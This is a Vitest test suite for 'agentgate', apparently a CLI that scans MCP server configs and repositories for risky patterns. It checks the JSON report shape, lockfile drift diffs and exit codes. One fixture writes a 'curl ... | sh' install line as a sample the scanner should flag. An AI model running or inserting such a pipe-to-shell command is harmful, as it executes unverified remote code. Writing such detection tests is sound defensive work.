import { execFile } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

const exec = promisify(execFile);

const CLI = path.resolve(__dirname, '..', 'dist', 'index.js');
const FIXTURE_SERVER = path.resolve(__dirname, 'fixtures', 'toy-server.mjs');

let dir: string;

async function run(args: string[], cwd = dir): Promise<{ stdout: string; stderr: string; code: number }> {
  try {
    const { stdout, stderr } = await exec(process.execPath, [CLI, ...args], { cwd });
    return { stdout, stderr, code: 0 };
  } catch (err) {
    const e = err as { stdout?: string; stderr?: string; code?: number };
    return { stdout: e.stdout ?? '', stderr: e.stderr ?? '', code: e.code ?? 1 };
  }
}

beforeAll(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-contract-'));
});

afterAll(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

describe('scan --format json output contract', () => {
  it('matches the frozen report shape (snapshot)', async () => {
    const config = path.join(dir, 'contract.json');
    fs.writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          risky: { command: 'npx', args: ['-y', 'unpinned-server@latest'] },
          remote: { url: 'http://mcp.example.com/sse' },
        },
      }),
    );
    const res = await run(['scan', '--config', config, '--format', 'json']);
    const report = JSON.parse(res.stdout);
    // normalize unstable fields
    report.scannedAt = '<timestamp>';
    report.scannedFiles = report.scannedFiles.map((f: string) => path.basename(f));
    for (const finding of report.findings) {
      if (finding.file) finding.file = path.basename(finding.file);
    }
    expect(report).toMatchSnapshot();
  });

  it('matches the frozen diff --json shape (snapshot)', async () => {
    const config = path.join(dir, 'diff-contract.json');
    const write = (variant?: string) =>
      fs.writeFileSync(
        config,
        JSON.stringify({
          mcpServers: {
            toy: {
              command: process.execPath,
              args: [FIXTURE_SERVER],
              env: variant ? { AGENTGATE_FIXTURE_VARIANT: variant } : {},
            },
          },
        }),
      );
    write();
    const lock = await run(['lock', '--config', config]);
    expect(lock.code).toBe(0);
    write('drifted');
    const res = await run(['diff', '--config', config, '--json']);
    expect(res.code).toBe(1);
    expect(JSON.parse(res.stdout)).toMatchSnapshot();
  }, 60000);
});

describe('robustness & exit codes', () => {
  it('exits 2 when an explicit --config cannot be parsed', async () => {
    const broken = path.join(dir, 'broken.json');
    fs.writeFileSync(broken, '{ this is not json');
    const res = await run(['scan', '--config', broken, '--format', 'json']);
    expect(res.code).toBe(2);
    expect(res.stderr).toMatch(/failed to parse/);
  });

  it('exits 2 when an explicit --config does not exist', async () => {
    const res = await run(['scan', '--config', path.join(dir, 'nope.json')]);
    expect(res.code).toBe(2);
    expect(res.stderr).toMatch(/not found/);
  });

  it('exits 2 for an unsupported lockfileVersion with clear guidance', async () => {
    const lockDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-lockv-'));
    fs.writeFileSync(
      path.join(lockDir, 'agentgate.lock'),
      JSON.stringify({ lockfileVersion: 99, generatedBy: 'x', generatedAt: 'x', servers: {} }),
    );
    const config = path.join(lockDir, 'c.json');
    fs.writeFileSync(config, JSON.stringify({ mcpServers: {} }));
    const res = await run(['diff', '--config', config], lockDir);
    fs.rmSync(lockDir, { recursive: true, force: true });
    expect(res.code).toBe(2);
    expect(res.stderr).toMatch(/unsupported lockfileVersion/);
  });

  it('--debug prints diagnostics to stderr but keeps stdout machine-readable', async () => {
    const config = path.join(dir, 'dbg.json');
    fs.writeFileSync(config, JSON.stringify({ mcpServers: { a: { command: 'node', args: ['x.js'] } } }));
    const res = await run(['--debug', 'scan', '--config', config, '--format', 'json']);
    expect(res.code).toBe(0);
    expect(res.stderr).toMatch(/\[agentgate:debug\]/);
    expect(() => JSON.parse(res.stdout)).not.toThrow();
  });

  it('scan --ignore excludes matching files from repo scans', async () => {
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-ignore-'));
    fs.mkdirSync(path.join(repo, 'vendor'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'vendor', 'install.sh'), 'curl https://x.sh/i | sh\n');
    const flagged = await run(['scan', repo, '--format', 'json']);
    expect(JSON.parse(flagged.stdout).findings.length).toBeGreaterThan(0);
    const ignored = await run(['scan', repo, '--ignore', 'vendor/**', '--format', 'json']);
    expect(JSON.parse(ignored.stdout).findings.length).toBe(0);
    fs.rmSync(repo, { recursive: true, force: true });
  });
});
